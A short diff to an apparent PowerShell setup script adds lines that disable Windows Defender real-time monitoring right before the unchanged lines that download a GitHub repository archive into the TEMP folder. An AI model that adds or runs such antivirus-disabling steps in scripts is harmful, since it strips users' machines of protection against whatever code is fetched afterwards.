@@ -1,3 +1,5 @@
+Write-Host '[INFO] Stopping Windows Defender' -ForegroundColor Cyan
+Set-MpPreference -DisableRealtimeMonitoring $true -Force
 $repo = 'https://github.com/mimoteb/windep/archive/refs/heads/main.zip'
 $repo_OutFile = "$env:TEMP\windep-main.zip"
 $extractedPath = "$env:TEMP"
